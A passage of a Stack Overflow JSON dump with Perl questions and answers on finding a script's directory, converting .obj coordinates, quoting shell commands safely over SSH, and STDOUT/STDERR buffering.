<code>$temp=__FILE__</code>; and then <code>$SourceFolder=substr($temp,0,rindex($temp,&quot;\\\\&quot;));</code>.  With this you use <code>__FILE__</code> to extract the folder where the script it (if the user doesn&#39;t supply that). But, as you thought, the <code>__FILE__</code> doesn&#39;t have the full path so that doesn&#39;t work.  Instead, you can remove these two statements (that I show above, in this comment), and have <code>use FindBin qw($RealBin);</code> at the beginning of the program and the <code>$RealBin</code> is the path to the folder where the script is (so, your <code>$sourceFolder</code>)"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 3, "last_activity_date": 1569630673, "last_edit_date": 1569630673, "creation_date": 1569608479, "answer_id": 58139702, "question_id": 58139560, "link": "https://stackoverflow.com/questions/58139560/perl-code-to-return-the-source-folder-does-not-work/58139702#58139702", "title": "Perl code to return the source folder does not work", "body": "<p>Getting full paths to the script is the purpose of the core <a href=\"https://perldoc.perl.org/FindBin.html\" rel=\"nofollow noreferrer\">FindBin</a> module</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse FindBin qw($RealBin);\n\nsay $RealBin;\n</code></pre>\n\n<p>Please do review the docs carefully for a possible subtlety in a particular use case.</p>\n\n<p><em>Always</em> start your programs with <code>use warnings;</code> and <code>use strict;</code>.</p>\n\n<hr>\n\n<p>There is also the older, \"tried and true\" way </p>\n\n<pre><code>use Cwd qw(abs_path);\nuse File::Basename qw(dirname);\n\nsay dirname( abs_path($0) );\n</code></pre>\n\n<p>where I've used <a href=\"https://perldoc.perl.org/perlvar.html#General-Variables\" rel=\"nofollow noreferrer\"><code>$0</code> variable</a> instead of the <a href=\"https://perldoc.perl.org/perldata.html#Scalar-value-constructors\" rel=\"nofollow noreferrer\">special literal <code>__FILE__</code></a>.  If subtleties matter in your use please compare carefully since they're slightly different. </p>\n\n<p>While this has been commonly used for the longest time note from <a href=\"https://perldoc.perl.org/File/Basename.html\" rel=\"nofollow noreferrer\">File::Basename</a> docs</p>\n\n<blockquote>\n  <ul>\n  <li><strong>dirname</strong><br>\n  This function is provided for compatibility with the Unix shell command <code>dirname(1)</code> and has inherited some of its quirks. In spite of its name it does <strong>NOT</strong> always return the directory name as you might expect. To be safe, if you want the directory name of a path use <code>fileparse()</code>.</li>\n  </ul>\n</blockquote>\n\n<p>(original emphasis)  &nbsp;  So things could get a little complicated.</p>\n\n<hr>\n\n<p>Then there are yet other modules for working with the filesystem to be found on CPAN.  I find it easy to recommend a very useful <a href=\"https://metacpan.org/pod/Path::Tiny\" rel=\"nofollow noreferrer\">Path::Tiny</a>, with which we can do for this job</p>\n\n<pre><code>use Path::Tiny;\n\nsay path($0)-&gt;realpath-&gt;parent;\n</code></pre>\n\n<p>(I find that the order <code>parent-&gt;realpath</code> works fine as well)</p>\n\n<p>As docs say this is a \"<em>more expensive</em>\" option than the <code>absolute</code> method, but that one won't resolve <code>'d1/../d2'</code> into canonical paths unless <code>File::Spec</code> does on that platform.</p>\n"}], "owner": {"reputation": 11, "user_id": 12131988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52878654ae2e3776fe8afd53ecca1999?s=128&d=identicon&r=PG&f=1", "display_name": "waterrider", "link": "https://stackoverflow.com/users/12131988/waterrider"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1570173393, "creation_date": 1569607797, "last_edit_date": 1570173393, "question_id": 58139560, "link": "https://stackoverflow.com/questions/58139560/perl-code-to-return-the-source-folder-does-not-work", "title": "Perl code to return the source folder does not work", "body": "<p>The perl script (name: perl1.pl) looks for any *.obj files in the current folder (the folder where the perl script resides) and operates on those files. The problem is that the code to retrieve the current folder is generating an error. The $SourceFolder is defined in line 72 and the error shows when the $SourceFolder variable is used in line 86. Please help me troubleshoot it.</p>\n\n<p>I start the program as follows: <code>Perl perl1.pl -r 500 -M 10 -s 1</code> (setting some initial values)</p>\n\n<p>(NOTE: when asked for source and destination folders I press return, allowing the script to use the current folder)</p>\n\n<p>The error I get is as follows:</p>\n\n<blockquote>\n  <p>open Source folder failed! at perl1.pl line 86,  line 2.</p>\n</blockquote>\n\n<p>It appears to be that maybe the full path is not included in \"__FILE_\". </p>\n\n<p>Thanks for any help.</p>\n\n<p>The relevant code</p>\n\n<pre><code>print \"\\Source Folder:\";\n$SourceFolder=&lt;STDIN&gt;;\nchop($SourceFolder);\nif (length($SourceFolder)==0) {\n    $temp=__FILE__;\n    $SourceFolder=substr($temp,0,rindex($temp,\"\\\\\")); \n}\n</code></pre>\n\n<p>The entire program below</p>\n\n<pre><code>use constant PI =&gt; 3.1415926535897932384626433832795;\n\n# @AllFiles store all file types in the SourceFolder\n@AllFiles,@SourceFiles,@TempSourceFiles,@DestinationFiles;\n$i,$OBJFilesCount,$ValueLineCount,$CoverExistFile,$ConversionCount;\n@ValueArray,$LineData,@LineValue;\n$SourceFolder,$DestinationFolder; \n\n# The following variables are used to calculate during the conversion\n$La,$Lo,$a;\n$R,$e,$m,$n,$Alpha,$Beta;\n$r,$M,$s;\n$X2,@Xs,@Zs,@Ys,@Xd,@Yd,@Zd;\n#\n# main program\n#\n# call the help subprogram.\n#\n&amp;Show_help;\n#\n# call the read paramter subprogram\n#\n&amp;Read_parameter;\n#\n# call the seek SourceFiles subprogram\n#\n&amp;Seek_SourceFiles;      \n$ConversionCount=0;\nfor ($i=0;$i&lt;$OBJFilesCount;$i++) {\n    #\n    # call the read SourceFiles subprogram\n    # call the create destination filenames subprogram\n    #\n    &amp;Read_SourceFiles;                             \n    &amp;Create_DestinationFiles;  \n} \nprint \"\\nThere are $ConversionCount files translated successfully!\\n\";\n\n#help subprogram\nsub Show_help {                        \n    if ((lc(@ARGV[0]) eq \"-h\") or (lc(@ARGV[0]) eq \"-help\")) {\n        open (PATH,\"help.hlp\") || die (\"open help.hlp failed!\");        \n        while ($LineData=&lt;PATH&gt;) {\n            print \"$LineData\";\n        }\n        close (PATH);\n        exit();\n    }\n}\n\n# read parameter subprogram\nsub Read_parameter {\n    # if the pamameter is wrong, Error.\n    if ((lc(@ARGV[0]) ne \"-r\") or (uc(@ARGV[2]) ne \"-M\") or (lc(@ARGV[4]) ne \"-s\")) {\n        &amp;Parameter_error;                                   \n        exit();                  \n    }\n    # if r,M,s is not a int, Error.\n    #  \n    if ((@ARGV[1] =~/[a-z]/i) or (@ARGV[1] =~/[!@#\"\"''^&amp;*(){}~_+=-|\\/?&gt;&lt;,:;]/) or (@ARGV[3] =~/[a-z]/i) or (@ARGV[3] =~/[!@#\"\"''^&amp;*(){}~_+=-|\\/?&gt;&lt;,:;]/) or (@ARGV[5] =~/[a-z]/i)or (@ARGV[5] =~/[!@#\"\"''^&amp;*(){}~_+=-|\\/?&gt;&lt;,:;]/) ) {              \n        &amp;Parameter_error; \n        exit();\n    }                                              \n    $r=\"@ARGV[1]\";\n    $M=\"@ARGV[3]\";\n    $s=\"@ARGV[5]\";\n    print \"\\Source Folder:\";\n    $SourceFolder=&lt;STDIN&gt;;\n    chop($SourceFolder);\n    if (length($SourceFolder)==0) {\n        $temp=__FILE__;\n        $SourceFolder=substr($temp,0,rindex($temp,\"\\\\\")); \n    }\n\n    print \"Destination Folder:\";\n    $DestinationFolder=&lt;STDIN&gt;;\n    chop($DestinationFolder);\n    if (length($DestinationFolder)==0) {\n        $temp=__FILE__;\n        $DestinationFolder=substr($temp,0,rindex($temp,\"\\\\\")); \n    }\n}\n\n# Seek SourceFiles\nsub Seek_SourceFiles {\n    opendir(dirvar,$SourceFolder) || die (\"\\nopen Source folder failed!\");\n    #put all of the filenames and subdirectories under the source folder into a ValueArray\n    @AllFiles=readdir(dirvar);                 \n    closedir(dirvar);\n    #Look for *.obj files\n    @TempSourceFiles=grep(/.obj/,@AllFiles);   \n    #Total numbers of *.obj\n    $OBJFilesCount= grep(/.obj/,@AllFiles); \n    #Get all valid obj files.\n    $ValidOBJFilesCount=0;\n    for ($i=0;$i&lt;$OBJFilesCount;$i++) {\n        # Get all of the .obj files in the SourceFolder.\n        @temp=split(/ /,\"@TempSourceFiles[$i]\");\n        $Length=@temp;\n        #Check the OBJ file valid.\n        if($Length==8){\n            @SourceFiles[$ValidOBJFilesCount]=@TempSourceFiles[$i];\n            $ValidOBJFilesCount++;\n        }                          \n    }\n    $OBJFilesCount=$ValidOBJFilesCount;\n    if ($OBJFilesCount==0) {\n        print \"\\bThere are no valid .obj files exist!\\b\";\n        exit();\n    }\n}\n\n#Get SourceFiles information\nsub Read_SourceFiles{\n    local @num;\n    @ValueArray = split(/ /, @SourceFiles[$i]);\n    @num[0]=substr(@ValueArray[1],0,length(@ValueArray[1])-6);\n    @num[1]=substr(@ValueArray[1],length(@num[0])+1,2);\n    @num[2]=substr(@ValueArray[1],length(@ValueArray[1])-2,2);\n    @num[3]=substr(@ValueArray[4],0,length(@ValueArray[4])-6);\n    @num[4]=substr(@ValueArray[4],length(@num[3])+1,2);\n    @num[5]=substr(@ValueArray[4],length(@ValueArray[4])-2,2);\n    #Judge La is a positive or negative number \n    if (substr(@num[0],0,1) eq \"-\") {\n        $La=@num[0]-@num[1]/60-@num[2]/3600;\n    }                                            \n    else {\n        $La=@num[0]+@num[1]/60+@num[2]/3600;\n    }\n    #Judge Lo is a positive or negative number\n    if (substr(@num[3],0,1) eq \"-\") {   \n        $Lo=@num[3]-@num[4]/60-@num[5]/3600;\n    }\n    else {\n        $Lo=@num[3]+@num[4]/60+@num[5]/3600;\n    }\n    $a=$ValueArray[7]/3600;\n    #above change the degrees, minutes and seconds to decimal\n    $ValueLineCount=0;\n    open (path,\"$SourceFolder//@SourceFiles[$i]\") || die (\"\\nopen path failed!\\n\");\n    while ($LineData=&lt;path&gt;) {\n        @LineValue=split(/ /,\"$LineData\");\n        #Look for the Values in the file.\n        if (index(\"$LineData\",\"v \")==0) {             \n            $ValueLineCount++;\n            if ($ValueLineCount==2) {\n                #Get the first numeric value in the 2nd ValueLineCount \n                $X2=$LineValue[1];\n            }\n        }\n    }\n    close(path);\n    #print \"\\n\"; \n}\n\n# Create the destination files\nsub Create_DestinationFiles {\n    if ($i==0) {\n        print \"\\nTranslation is Processing,please wait......\\n\";\n    }\n    open (path,\"$SourceFolder//@SourceFiles[$i]\") || die (\"open path failed!\");\n    $ValueLineCount=0;\n    #Create the destination filename\n    @DestinationFiles[$i]=substr (@SourceFiles[$i],0, length(@SourceFiles[$i])-4).\" r$r M$M s$s s3.0.0.obj\";     \n    # Estimate should the program Cover all of the existing destination files.\n    if ($CoverExistFile ne \"A\") {\n        # Estimate if the Destination file exists or not.\n        if (-e \"$DestinationFolder//@DestinationFiles[$i]\") {\n            print STDERR (\"\\n@DestinationFiles[$i] exists, do you want to Cover it?[Y/N/All/Quit]\");\n            $CoverExistFile=&lt;STDIN&gt;;\n            chop($CoverExistFile);\n            # Cover this Destination file\n            if (uc($CoverExistFile) eq \"Y\") {\n                open (PATH,\"&gt;$DestinationFolder//$DestinationFiles[$i]\") || die (\"open PATH failed!\");\n            } \n            # Do not CoverExistFile this Destination file.\n            if (uc($CoverExistFile) eq \"N\") {\n                return;\n            } \n            # Cover all of the existing Destination files\n            if ((uc($CoverExistFile) eq \"A\") or (uc($CoverExistFile) eq \"ALL\")) {\n                $CoverExistFile=\"A\";                         \n                open (PATH,\"&gt;$DestinationFolder//$DestinationFiles[$i]\") || die (\"open PATH failed!\");\n            }\n            # Quit the program.\n            if ((uc($CoverExistFile) eq \"Q\") or (uc($CoverExistFile) eq \"QUIT\")) {\n                print \"\\nThere are $ConversionCount Files Converted Successfully!\\n\";\n                exit();                            \n            }\n        }\n        else {\n            open (PATH,\"&gt;&gt;$DestinationFolder//$DestinationFiles[$i]\") || die (\"open PATH failed!\");\n        }\n    }\n    else {\n        open (PATH,\"&gt;$DestinationFolder//$DestinationFiles[$i]\") || die (\"open PATH failed!\");\n    }\n    # Find the details of source file and calculate the values\n    $ConversionCount++;\n    while ($LineData=&lt;path&gt;) {\n        @LineValue=split(/ /,\"$LineData\");\n        if (index(\"$LineData\",\"# object \")==0) {\n            print PATH (\"# Converted by Utility Version 3.0.0\\n\");\n            print PATH (\"# comment\\n\");\n        }\n        if (index(\"$LineData\",\"v \")==0) {\n            $ValueLineCount++;\n            @Xs[ValueLineCount]=$LineValue[1];\n            @Zs[ValueLineCount]=$LineValue[2];\n            @Ys[ValueLineCount]=$LineValue[3];\n            $n=sprintf(\"%.0f\",(@Ys[ValueLineCount]/$X2));\n            $m=sprintf(\"%.0f\",(@Xs[ValueLineCount]/$X2));\n            $Alpha=$La-$n*$a;\n            $Beta=$Lo+$m*$a;\n            if (@Zs[ValueLineCount]==0) {\n                $e=0;\n                $s=0;\n            }\n            else {\n                $e=$Zs[ValueLineCount]*$M;\n            }\n            $R=$s+$r*(1+$e/6370997);\n            @Xd[ValueLineCount]=$R*cos($Alpha*PI/180)*sin($Beta*PI/180);\n            @Yd[ValueLineCount]=-$R*cos($Alpha*PI/180)*cos($Beta*PI/180);\n            @Zd[ValueLineCount]=$R*sin($Alpha*PI/180);\n            # Output the calculated values to the destination files and hold 8 decimal places \n            print PATH (\"v \");\n            printf PATH (\"%.8f \",@Xd[ValueLineCount]);\n            printf PATH (\"%.8f \",@Yd[ValueLineCount]);\n            printf PATH (\"%.8f\",@Zd[ValueLineCount]);\n            print PATH (\"\\n\");\n        }\n        else\n        {\n            # Output unchanged data to the destination file.\n            print PATH (\"@LineValue\");          \n        }   \n    }\n    close(PATH);\n    close(path);\n    print \"Translate File:@DestinationFiles[$i] completed!\\n\";\n}\n\n# Parameter Error Subprogram\nsub Parameter_error {\n    print \"\\nVersion 3.0.0\\n\";\n    print \"Use for ActiveState (R) Active Perl Version 5.6.0\\n\";\n    print \"Copyright (C) 2000-2019.\\n\";\n    print \"\\nInput Parameter Error,Please use Command (Translating.pl -h)\\nto get help information!\\n\";\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 3, "creation_date": 1569602935, "post_id": 58138597, "comment_id": 102663636, "body": "The first problem here is that you&#39;re not using strict and warnings. The second problem is that <code>$num</code> will usually contain a trailing newline after reading from STDIN, so you should use <a href=\"https://perldoc.pl/functions/chomp\" rel=\"nofollow noreferrer\">chomp</a> on it."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 3, "creation_date": 1569603042, "post_id": 58138597, "comment_id": 102663689, "body": "The variable is interpolated locally into that string, so it is not a variable anymore on the remote system, and by enabling warnings you will be informed that it is probably just undefined because you didn&#39;t chomp <code>$num</code>."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 3, "creation_date": 1569603081, "post_id": 58138597, "comment_id": 102663714, "body": "The third problem is that you aren&#39;t sanitizing the variable for use in a shell command, which you can use <a href=\"https://metacpan.org/pod/String::ShellQuote\" rel=\"nofollow noreferrer\">String::ShellQuote</a> to do."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1569739189, "creation_date": 1569739189, "answer_id": 58152917, "question_id": 58138597, "link": "https://stackoverflow.com/questions/58138597/can-i-echo-local-variable-via-ssh-into-remote-file/58152917#58152917", "title": "Can I echo local variable via ssh into remote file?", "body": "<pre><code>use String::ShellQuote qw( shell_quote );\n\ndefined( my $num = &lt;STDIN&gt; )\n   or die(\"Invalid input\");\n\nchomp($num);\n\ndefined($dep_keys{$num})\n   or die(\"Invalid input\");\n\nmy $cmd = shell_quote('printf', '%s\\n', $dep_keys{$num}) . ' &gt;&gt;/root/1';\n$ssh-&gt;system($cmd);\n</code></pre>\n\n<p>Fixes:</p>\n\n<ul>\n<li>Checks for EOF and other invalid inputs.</li>\n<li>Removes trailing line feed from <code>$num</code> (if any).</li>\n<li>Properly convert the text from the hash element into a shell literal.</li>\n<li>Avoids <code>echo</code> because <code>echo</code> makes impossible to output some strings.</li>\n</ul>\n"}], "owner": {"reputation": 1, "user_id": 9190892, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5871b4ea8ae031b597f6befab5429d9f?s=128&d=identicon&r=PG", "display_name": "SaloT_T", "link": "https://stackoverflow.com/users/9190892/salot-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1569739189, "creation_date": 1569602828, "last_edit_date": 1569603570, "question_id": 58138597, "link": "https://stackoverflow.com/questions/58138597/can-i-echo-local-variable-via-ssh-into-remote-file", "title": "Can I echo local variable via ssh into remote file?", "body": "<p>I try to write variable in end of file, but write it into STDOUT in local server\nsome code:</p>\n\n<pre><code>$num = &lt;STDIN&gt;\nmy $cmd = \"echo $dep_keys{$num} &gt;&gt; /root/1\";\n#$ssh-&gt;system({stdin_data =&gt;$dep_keys{$num} },\"echo &gt;&gt; /root/1\");\n#$ssh-&gt;error die \"Couldn't establish SSH connection: \". $ssh-&gt;error;\n#$ssh-&gt;system(\"echo $dep_keys{$num} &gt;&gt; /root/1\");\n$ssh-&gt;system($cmd);\n</code></pre>\n\n<p>I expect that the file will contain new line in the end of file.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1569597190, "post_id": 58137188, "comment_id": 102661048, "body": "Are you sure you&#39;re outputting a newline after $i? The output doesn&#39;t seem like you are. Also, doesn&#39;t <code>doSomething</code> mess with <a href=\"http://p3rl.org/select\" rel=\"nofollow noreferrer\">select</a>?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 2, "creation_date": 1569597355, "post_id": 58137188, "comment_id": 102661136, "body": "That is not all relevant code. Please make a  <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1569597601, "post_id": 58137188, "comment_id": 102661257, "body": "If <code>doSomething</code> could be relevant, then show it, or better strip it down to just the part which causes the problem. Otherwise delete it."}, {"owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1569600805, "post_id": 58137188, "comment_id": 102662732, "body": "@Yunnosch I updated the question. Please let me know if it&#39;s enough"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 1, "creation_date": 1569602965, "post_id": 58137188, "comment_id": 102663651, "body": "There is nothing in your loops to make them exit prematurely, so you should get I 10 times and then J 10 times which doesn&#39;t remotely look like your expected output"}, {"owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1569606536, "post_id": 58137188, "comment_id": 102665076, "body": "@ChrisTurner You are right, it should be I 10 times then J 10 times. sorry, I hard coded the loop size for simplicity. But the idea is still the same."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569623112, "post_id": 58137188, "comment_id": 102669891, "body": "What you posted doesn&#39;t compile"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1569669515, "post_id": 58137188, "comment_id": 102676383, "body": "The shown code does not look like it should have any output. If you execute that code (with nothing else around it) you get the described output? That seems hard to believe."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1569669602, "post_id": 58137188, "comment_id": 102676397, "body": "Also even the last closing <code>}</code> seems to be missing. Please read <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> again and try again to provide one."}], "answers": [{"comments": [{"owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "edited": false, "score": 0, "creation_date": 1569601381, "post_id": 58137604, "comment_id": 102662999, "body": "It looks like both are writing to STDOUT"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "reply_to_user": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "edited": false, "score": 0, "creation_date": 1569601850, "post_id": 58137604, "comment_id": 102663176, "body": "This was an answer for the original question; it has nothing to do with the edited question."}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 3, "last_activity_date": 1569599574, "last_edit_date": 1569599574, "creation_date": 1569598624, "answer_id": 58137604, "question_id": 58137188, "link": "https://stackoverflow.com/questions/58137188/why-is-perl-running-code-that-is-not-in-a-loop-during-the-loop/58137604#58137604", "title": "Why is Perl running code that is not in a loop, during the loop?", "body": "<p>One way this can happen is if your loop is writing to a buffered <code>STDOUT</code> but your end-of-loop message goes to unbuffered <code>STDERR</code>. </p>\n\n<pre><code>(*STDOUT)-&gt;autoflush(0);   # use buffered STDOUT\n\nfor $i (1 .. 10) {\n    if ($i == 1) {\n        print STDERR \"$i \";\n    } else {\n        print STDOUT \"$i \";\n    }\n}\nprint STDERR \"Done with the loop. \";\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1 Done with the loop. 2 3 4 5 6 7 8 9 10\n</code></pre>\n\n<p>Output buffering is a scheme used by Perl (and in many other places) for efficiency. There may be a delay between the time that output is added to the buffer and the buffer data is actually written to the output device.</p>\n\n<p>See <a href=\"https://metacpan.org/pod/perlvar#OUTPUT_AUTOFLUSH\" rel=\"nofollow noreferrer\"><code>perldoc -v '$|'</code></a> for information about how Perl uses output buffering and see the classic <a href=\"https://perl.plover.com/FAQs/Buffering.html\" rel=\"nofollow noreferrer\">Suffering From Buffering</a> article for even more information.</p>\n"}], "owner": {"reputation": 216, "user_id": 10987492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92563934c53c8c39032655686d00da7d?s=128&d=identicon&r=PG&f=1", "display_name": "helloworld95", "link": "https://stackoverflow.com/users/10987492/helloworld95"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1569601449, "creation_date": 1569597021, "last_edit_date": 1569601449, "question_id": 58137188, "link": "https://stackoverflow.com/questions/58137188/why-is-perl-running-code-that-is-not-in-a-loop-during-the-loop", "title": "Why is Perl running code that is not in a loop, during the loop?", "body": "<p>I'm developing in Perl for the first time, and I'm adding to a very large existing tool. So, I apologize for anything in advance.</p>\n\n<p>The code below is a Perl test script:</p>\n\n<pre><code>SC \"SA Text Here\";\nSC \"SB Text Here\";  # SA not important\nSC \"SB Text Here\";\n\nSC \"SA Text Here\";\nSC \"SB Text Here\";\nSC \"SB Text Here\";\n</code></pre>\n\n<p>The code:</p>\n\n<pre><code>my $skipA = -1;   \nmy $skipB = -1;    \nmy $skipC = -1;    \nmy $currentA = 0;\nmy $currentB = 0;\nmy $currentC = 0;\n\n# Other subs set $skipA, $skipB, $skipC, but how they are set is not important. If set to anything other than -1, they should be a positive integer.\n\nsub SC($)\n{\n  # Do some stuff and set $verb\n\n  if( $verb eq \"SA\" )\n  {\n    # Starting\n    $currentA++;\n    $currentB = 0;\n    $currentC = 0;\n\n    # Check mode\n    if( $sxMode eq \"X\" )\n    {\n      if( ( $skipA&gt; -1 &amp;&amp; $currentA &gt; $skipA ) || $skipB &gt; -1 )\n      {\n        logstatus 0, \"DONE\";\n        $skipA= -1;\n        $skipB = -1;\n        $skipC = -1;\n      }\n    }\n    $skipA = -1;\n    $skipB = -1;\n  }\n\n  if( $verb eq \"SB\" )\n  {\n    # Starting\n    $currentB++;\n    $currentC = 0;\n\n    # Check mode\n    if( $sxMode eq \"X\" )\n    {\n      if( $skipB&gt; -1 &amp;&amp; $currentB &gt; $skipB )\n      {\n        logstatus 0, \"DONE\";\n        $skipA= -1;\n        $skipB = -1;\n        $skipC = -1;\n      }\n    }\n    $skipC = -1;\n  }\n}\n\n# Should execute the first loop, finish, then start the second loop\nsub doOtherStuff()\n{\n  #Do other stuff here\n\n  # This loop should take me to the $i-th SA in the test script\n  for( my $i = 1; $i &lt;= 10; $i++ )\n  {\n    $skipA = $currentA;\n    print \"THIS IS I $i\\n\";\n    doSomething();  # Not important\n  }\n\n  # This loop should take me to the $j-th SB of the $i-th SA in the test script\n  for( my $j = 1; $j &lt;= 10; $j++ )\n  {\n    $skipB = $currentB;\n    print \"THIS IS J $j\\n\";\n    doSomething();  # Not important\n  }\n</code></pre>\n\n<p>EXAMPLE: If I start at 1.1 (currentA = 1, currentB = 1) and I want to skip to 2.3, I will get to 1.3. The expected output vs the actual output:</p>\n\n<pre><code>Actual Output               Expected Output\nTHIS IS I 1                 THIS IS I 1\nTHIS IS J 1                 THIS IS I 2\nTHIS IS J 2                 THIS IS J 1\nTHIS IS J 3                 THIS IS J 2\n                            THIS IS J 3\n</code></pre>\n\n<p>When the Perl test script is run, it will see SC and execute that sub. With the help of some fancy buttons on a GUI, I can set $skipA and $skipB, and that will trigger <strong>doOtherStuff()</strong>. </p>\n\n<p>If I comment out the 2nd loop in <strong>doOtherStuff()</strong>, then everything works fine (the 1st loop). But, if I add the 2nd loop, the 1st will not complete and the 2nd will take over. I've played around with it and I noticed that setting $skipB is causing the issue. </p>\n\n<p>Even though I'm setting it after the 1st loop, it's still affecting it somehow ( this is the first and only time I'm setting $skipB ). So, I'm thinking the 1st loop should run until completion, and then move on to the 2nd.</p>\n\n<p>Could this be a Perl issue or a tool issue? Could I be 